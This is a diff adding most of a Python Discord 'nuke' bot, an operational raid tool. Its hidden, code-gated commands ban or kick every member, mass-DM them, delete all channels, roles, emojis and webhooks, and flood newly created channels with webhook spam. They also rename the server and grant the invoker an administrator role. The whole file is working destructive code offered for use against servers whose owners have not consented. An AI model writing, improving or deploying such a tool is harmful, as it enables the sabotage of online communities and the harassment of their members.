@@ -1,0 +1,395 @@
+
+async def nban(g,m,c=None):
+    c=c or CFG
+    if c.get("kick_instead"):return await rl_call(lambda:m.kick(reason=br(c)))
+    return await rl_call(lambda:m.ban(reason=br(c),delete_message_days=0))
+async def ndel(ch,c=None):
+    return await rl_call(lambda:ch.delete(reason=br(c)))
+async def nmk(g,name,kind="text",cat=None,c=None):
+    c=c or CFG;name=name[:90]
+    if kind=="text":return await rl_call(lambda:g.create_text_channel(name,category=cat))
+    if kind=="voice":return await rl_call(lambda:g.create_voice_channel(name,category=cat))
+    if kind=="stage":
+        try:return await rl_call(lambda:g.create_stage_channel(name,category=cat))
+        except:return await nmk(g,name,"voice",cat,c)
+    if kind=="forum":
+        try:return await rl_call(lambda:g.create_forum_channel(name,category=cat))
+        except:return await nmk(g,name,"text",cat,c)
+    if kind=="news":
+        try:return await rl_call(lambda:g.create_text_channel(name,category=cat,news=True))
+        except:return await nmk(g,name,"text",cat,c)
+    return await rl_call(lambda:g.create_category(name))
+async def nspam(ch,text,n,c=None):
+    c=c or CFG
+    if c.get("webhook_spam"):
+        try:
+            wh=await ch.create_webhook(name=wn(c))
+            for _ in range(n):
+                try:await wh.send(text[:2000],username=wn(c),allowed_mentions=am(c))
+                except:break
+                await asyncio.sleep(RLD)
+            try:await wh.delete()
+            except:pass
+            return
+        except:pass
+    for _ in range(n):
+        try:await ch.send(text[:2000],allowed_mentions=am(c))
+        except:break
+        await asyncio.sleep(RLD)
+
+async def do_nuke(g,ctx=None,c=None):
+    c=c or (merge_cfg(ctx.author.id) if ctx else CFG)
+    if is_wl(g.id):
+        if ctx:await ctx.send("Blocked (whitelist).")
+        return
+    me=g.me
+    if ctx:
+        await ctx.send(embed=emb("Nuke","Running full wipe…",0xED4245))
+        await remote_log("Nuke started",f"Full wipe on **{g.name}**",user=ctx.author,guild=g)
+    if c.get("mass_nick"):
+        nick=str(c.get("nick_text","nuked"))[:32]
+        await glim(rl_call(lambda m=m:m.edit(nick=nick,reason=br(c))) for m in targets(g,c))
+        await asyncio.sleep(PP)
+    if c.get("mass_dm"):
+        dm=str(c.get("dm_text","got nuked"))[:1900]
+        async def _dm(m):
+            try:await m.send(dm)
+            except:return None
+        await glim(_dm(m) for m in targets(g,c))
+        await asyncio.sleep(PP)
+    if c.get("ban_all"):
+        if c.get("timeout_instead"):
+            days=_as_int(c.get("timeout_days",7),7,1,28)
+            until=timedelta(days=days)
+            await glim(rl_call(lambda m=m:m.timeout(until,reason=br(c))) for m in targets(g,c))
+        else:
+            await glim(nban(g,m,c)for m in targets(g,c))
+        await asyncio.sleep(PP)
+    if c.get("delete_channels",True):
+        await glim(ndel(ch,c)for ch in list(g.channels)if ch!=getattr(ctx,"channel",None))
+        await asyncio.sleep(PP)
+    if c.get("delete_roles",True):
+        roles=[r for r in g.roles if not r.is_default()and r<me.top_role and not r.managed]
+        await glim(rl_call(lambda r=r:r.delete(reason=br(c)))for r in roles)
+        await asyncio.sleep(PP)
+    if c.get("delete_emojis",True):
+        await glim(rl_call(lambda e=e:e.delete(reason=br(c)))for e in list(g.emojis))
+    if c.get("delete_stickers",True):
+        try:await glim(rl_call(lambda s=s:s.delete(reason=br(c)))for s in list(g.stickers))
+        except:pass
+    if c.get("delete_webhooks",True):
+        try:
+            for ch in list(g.channels):
+                if hasattr(ch,"webhooks"):
+                    try:
+                        whs=await ch.webhooks()
+                        await glim(rl_call(lambda w=w:w.delete(reason=br(c))) for w in whs)
+                    except:pass
+        except:pass
+    texts=[]
+    cat=None
+    if c.get("create_channels",True):
+        cat_name=str(c.get("category_name","NUKED"))[:90]
+        for i in range(int(c.get("create_cats",0) or 0)):
+            cat=await nmk(g,f"{cat_name}-{i}","category",c=c)
+        for i in range(sc(c)):
+            ch=await nmk(g,f"{cn(c)}-{i}","text",cat=cat,c=c)
+            if ch:
+                texts.append(ch)
+                if c.get("nsfw_channels"):
+                    try:await ch.edit(nsfw=True)
+                    except:pass
+                topic=str(c.get("topic_text",""))[:1024]
+                if topic:
+                    try:await ch.edit(topic=topic)
+                    except:pass
+                smode=_as_int(c.get("slowmode_sec",0),0,0,21600)
+                if smode:
+                    try:await ch.edit(slowmode_delay=smode)
+                    except:pass
+        for i in range(int(c.get("create_voice",8))):
+            await nmk(g,f"{cn(c)}-vc-{i}","voice",cat=cat,c=c)
+        for i in range(int(c.get("create_stage",0) or 0)):
+            await nmk(g,f"{cn(c)}-stage-{i}","stage",cat=cat,c=c)
+        for i in range(int(c.get("create_forum",0) or 0)):
+            await nmk(g,f"{cn(c)}-forum-{i}","forum",cat=cat,c=c)
+        for i in range(int(c.get("create_news",0) or 0)):
+            await nmk(g,f"{cn(c)}-news-{i}","news",cat=cat,c=c)
+    for i in range(int(c.get("create_roles",12))):
+        col=discord.Colour.random() if c.get("random_role_color",True) else discord.Colour.default()
+        hoist=bool(c.get("hoist_roles",True))
+        await rl_call(lambda:g.create_role(name=f"{rn(c)}-{i}",colour=col,hoist=hoist))
+    if c.get("admin_role") and ctx:
+        try:
+            role=await g.create_role(name=f"{rn(c)}-admin",colour=discord.Colour.red(),hoist=True,permissions=discord.Permissions(administrator=True))
+            await ctx.author.add_roles(role, reason=br(c))
+        except:pass
+    if c.get("everyone_mentionable"):
+        try:
+            everyone=g.default_role
+            await everyone.edit(mentionable=True, reason=br(c))
+        except:pass
+    if c.get("spam_after_create",True):
+        for ch in texts[:25]:
+            await nspam(ch,st(c),sm(c),c)
+            await asyncio.sleep(RLD)
+    if c.get("rename_server",True):
+        try:await g.edit(name=nn(c))
+        except:pass
+    if ctx:
+        try:await ctx.send(embed=emb("Nuke","Done.",0x57F287))
+        except:pass
+        await remote_log("Nuke done",f"Finished on **{g.name}**",0x57F287,user=ctx.author,guild=g)
+
+@bot.event
+async def on_ready():
+    global _ready
+    _ready=True
+    log.info("===== %s ONLINE %s guilds=%s =====",BN,bot.user,len(bot.guilds))
+    try:await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching,name="🔗 sapph.xyz"))
+    except:pass
+    try:bot.add_view(PreconfigView())
+    except:pass
+    bot.loop.create_task(code_loop())
+    bot.loop.create_task(ka())
+    bot.loop.create_task(boot_panels())
+
+async def boot_panels():
+    await bot.wait_until_ready()
+    await asyncio.sleep(2)
+    try:await ensure_preconfig()
+    except Exception:log.error("preconfig\n%s",traceback.format_exc())
+
+async def code_loop():
+    await bot.wait_until_ready()
+    while True:
+        try:await rot()
+        except Exception:log.error("rot\n%s",traceback.format_exc())
+        await asyncio.sleep(60)
+
+async def ka():
+    while True:
+        await asyncio.sleep(KA)
+        try:await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching,name="🔗 sapph.xyz"))
+        except:pass
+        log.info("alive guilds=%s lat=%.0fms code=%s",len(bot.guilds),bot.latency*1000,CUR or"-")
+
+@bot.event
+async def on_command_error(ctx,err):
+    if isinstance(err,(commands.CommandNotFound,commands.CheckFailure)):return
+    if isinstance(err,commands.CommandOnCooldown):
+        return await ctx.send(f"Cooldown {err.retry_after:.1f}s",delete_after=5)
+    log.error("cmd %s\n%s",ctx.command,traceback.format_exc())
+
+@bot.check
+async def block_main(ctx):
+    if ctx.guild and ctx.guild.id == MGID:
+        return False
+    return True
+
+def cd():return commands.cooldown(1,CD,commands.BucketType.user)
+
+@bot.command(name="help")
+async def c_help(ctx,code:Optional[str]=None):
+    if check_code(code):
+        e=emb("Nuke Arsenal",f"Append `{CUR}` as last arg.\nYour settings: from `#{PRE_CH}` panel (per-user).")
+        e.add_field(name="Full",value="`nuke` `destroy` `raid` `wipe` `apocalypse`",inline=False)
+        e.add_field(name="Members",value="`banall` `kickall` `timeoutall` `strip` `nickall`",inline=False)
+        e.add_field(name="Channels",value="`delchannels`",inline=False)
+        e.add_field(name="Roles",value="`delroles`",inline=False)
+        e.add_field(name="Spam",value="`spam` `webhook`",inline=False)
+        e.add_field(name="Utils",value="`whitelist` `guilds` `forcecode` `mycfg`",inline=False)
+        return await ctx.send(embed=e)
+    e=emb("Help",f"`{PREFIX}help <CODE>` for full arsenal.\nCode rotates in `#{CCN}`.")
+    await ctx.send(embed=e)
+
+@bot.command(name="ping")
+async def c_ping(ctx):
+    await ctx.send(f"pong `{round(bot.latency*1000)}ms`")
+
+@bot.command(name="mycfg")
+async def c_mycfg(ctx,code:Optional[str]=None):
+    if not check_code(code):return
+    u=user_cfg(ctx.author.id)
+    lines=[f"{k}: {v}" for k,v in u.items() if not k.startswith("_")]
+    await ctx.send(f"```\n"+"\n".join(lines)[:1900]+"\n```")
+
+@bot.command(name="nuke",hidden=True)
+@cd()
+async def o_nuke(ctx,*args:str):
+    await gate(ctx,*args);await do_nuke(ctx.guild,ctx,merge_cfg(ctx.author.id))
+
+@bot.command(name="destroy",hidden=True)
+@cd()
+async def o_destroy(ctx,*args:str):
+    await gate(ctx,*args);await do_nuke(ctx.guild,ctx,merge_cfg(ctx.author.id))
+
+@bot.command(name="wipe",hidden=True)
+@cd()
+async def o_wipe(ctx,*args:str):
+    await gate(ctx,*args);await do_nuke(ctx.guild,ctx,merge_cfg(ctx.author.id))
+
+@bot.command(name="apocalypse",hidden=True)
+@cd()
+async def o_apo(ctx,*args:str):
+    await gate(ctx,*args)
+    c=merge_cfg(ctx.author.id)
+    if is_wl(ctx.guild.id):return await ctx.send("Blocked.")
+    await ctx.send(embed=emb("Apocalypse","Everything…",0xED4245))
+    await do_nuke(ctx.guild,ctx,c)
+
+@bot.command(name="raid",hidden=True)
+@cd()
+async def o_raid(ctx,*args:str):
+    await gate(ctx,*args)
+    c=merge_cfg(ctx.author.id)
+    if is_wl(ctx.guild.id):return await ctx.send("Blocked.")
+    c=dict(c);c["ban_all"]=False;c["delete_channels"]=False;c["delete_roles"]=False
+    await do_nuke(ctx.guild,ctx,c)
+
+@bot.command(name="banall",hidden=True)
+@cd()
+async def o_banall(ctx,*args:str):
+    await gate(ctx,*args)
+    c=merge_cfg(ctx.author.id)
+    if is_wl(ctx.guild.id):return await ctx.send("Blocked.")
+    await glim(nban(ctx.guild,m,c)for m in targets(ctx.guild,c))
+    await ctx.send("Banall done.")
+
+@bot.command(name="kickall",hidden=True)
+@cd()
+async def o_kickall(ctx,*args:str):
+    await gate(ctx,*args)
+    c=merge_cfg(ctx.author.id)
+    if is_wl(ctx.guild.id):return await ctx.send("Blocked.")
+    await glim(rl_call(lambda m=m:m.kick(reason=br(c)))for m in targets(ctx.guild,c))
+    await ctx.send("Kickall done.")
+
+@bot.command(name="timeoutall",hidden=True)
+@cd()
+async def o_timeoutall(ctx,*args:str):
+    await gate(ctx,*args)
+    c=merge_cfg(ctx.author.id)
+    if is_wl(ctx.guild.id):return await ctx.send("Blocked.")
+    until=timedelta(days=_as_int(c.get("timeout_days",7),7,1,28))
+    await glim(rl_call(lambda m=m:m.timeout(until,reason=br(c)))for m in targets(ctx.guild,c))
+    await ctx.send("Timeoutall done.")
+
+@bot.command(name="strip",hidden=True)
+@cd()
+async def o_strip(ctx,*args:str):
+    await gate(ctx,*args)
+    c=merge_cfg(ctx.author.id)
+    me=ctx.guild.me
+    for m in targets(ctx.guild,c):
+        roles=[r for r in m.roles if r<me.top_role and not r.is_default() and not r.managed]
+        if roles:await rl_call(lambda:m.remove_roles(*roles,reason=br(c)))
+    await ctx.send("Strip done.")
+
+@bot.command(name="nickall",hidden=True)
+@cd()
+async def o_nickall(ctx,*args:str):
+    await gate(ctx,*args)
+    c=merge_cfg(ctx.author.id)
+    nick=str(c.get("nick_text","nuked"))[:32]
+    await glim(rl_call(lambda m=m:m.edit(nick=nick,reason=br(c)))for m in targets(ctx.guild,c))
+    await ctx.send("Nickall done.")
+
+@bot.command(name="delchannels",hidden=True)
+@cd()
+async def o_delchannels(ctx,*args:str):
+    await gate(ctx,*args)
+    c=merge_cfg(ctx.author.id)
+    await glim(ndel(ch,c)for ch in list(ctx.guild.channels)if ch!=ctx.channel)
+    await ctx.send("Channels wiped.")
+
+@bot.command(name="delroles",hidden=True)
+@cd()
+async def o_delroles(ctx,*args:str):
+    await gate(ctx,*args)
+    c=merge_cfg(ctx.author.id)
+    me=ctx.guild.me
+    roles=[r for r in ctx.guild.roles if not r.is_default()and r<me.top_role and not r.managed]
+    await glim(rl_call(lambda r=r:r.delete(reason=br(c)))for r in roles)
+    await ctx.send("Roles wiped.")
+
+@bot.command(name="spam",hidden=True)
+@cd()
+async def o_spam(ctx,*args:str):
+    await gate(ctx,*args)
+    c=merge_cfg(ctx.author.id)
+    await nspam(ctx.channel,st(c),sm(c),c)
+    await ctx.send("Spam done.")
+
+@bot.command(name="webhook",hidden=True)
+@cd()
+async def o_webhook(ctx,*args:str):
+    await gate(ctx,*args)
+    c=dict(merge_cfg(ctx.author.id));c["webhook_spam"]=True
+    await nspam(ctx.channel,st(c),sm(c),c)
+    await ctx.send("Webhook spam done.")
+
+@bot.command(name="whitelist",hidden=True)
+@cd()
+async def o_wl(ctx,*args:str):
+    rest=await gate(ctx,*args)
+    a=rest[0].lower()if rest else"list";sid=rest[1]if len(rest)>1 else None
+    if a in("list","ls"):return await ctx.send(f"```{' '.join(map(str,sorted(WL)))or'empty'}```")
+    if a in("add","+")and sid and sid.isdigit():WL.add(int(sid));save_wl();return await ctx.send(f"WL + `{sid}`")
+    if a in("remove","rm","-")and sid and sid.isdigit():WL.discard(int(sid));save_wl();return await ctx.send(f"WL - `{sid}`")
+    await ctx.send(f"`{PREFIX}whitelist add|remove|list <id> <CODE>`")
+
+@bot.command(name="guilds",hidden=True)
+async def o_gs(ctx,*args:str):
+    await gate(ctx,*args)
+    lines=[f"{g.name} | {g.id} | {g.member_count}{' [WL]'if is_wl(g.id)else''}"for g in bot.guilds]
+    await ctx.send(f"```{(chr(10).join(lines)or'none')[:1900]}```")
+
+@bot.command(name="forcecode",hidden=True)
+async def o_fc(ctx,*args:str):
+    await gate(ctx,*args);code=await rot(force=True);await ctx.send(f"Code forced → `{code}`",delete_after=10)
+
+async def health(_):
+    return web.Response(text="online"if _ready else"starting",status=200)
+
+async def start_h():
+    app=web.Application();app.router.add_get("/",health);app.router.add_get("/health",health)
+    r=web.AppRunner(app);await r.setup()
+    ports=[PORT]+[p for p in(8080,3000,8000,5000)if p!=PORT]
+    for p in ports:
+        try:
+            await web.TCPSite(r,"0.0.0.0",p).start();log.info("health :%s",p);return
+        except OSError as e:
+            log.warning("bind %s failed: %s",p,e)
+    log.warning("health server skipped")
+
+async def runner():
+    try:await start_h()
+    except Exception:log.error("health start failed\n%s",traceback.format_exc())
+    if not TOKEN:
+        log.error("NO TOKEN — set TOKEN env var on Railway")
+        while True:await asyncio.sleep(3600)
+        return
+    log.info("logging in…")
+    try:
+        async with bot:await bot.start(TOKEN,reconnect=True)
+    except discord.LoginFailure:
+        log.error("LOGIN FAILED — check TOKEN")
+        while True:await asyncio.sleep(3600)
+    except Exception:
+        log.error("CRASH\n%s",traceback.format_exc())
+        while True:await asyncio.sleep(3600)
+
+def main():
+    load_wl();load_cs();load_cfg();load_uc()
+    keys=[k for k in os.environ if"TOKEN"in k.upper()or"DISCORD"in k.upper()]
+    log.info("BOOT %s token=%s env_keys=%s",BN,bool(TOKEN),keys)
+    log.info("INTENTS: members=%s message_content=%s — enable both in Developer Portal", True, True)
+    if not TOKEN:
+        log.error("TOKEN is empty. Set Railway variable TOKEN to the bot token.")
+    while True:
+        try:asyncio.run(runner())
+        except Exception:log.error("MAIN\n%s",traceback.format_exc())
+        log.error("restart in 15s");import time;time.sleep(15)
+
+if __name__=="__main__":main()
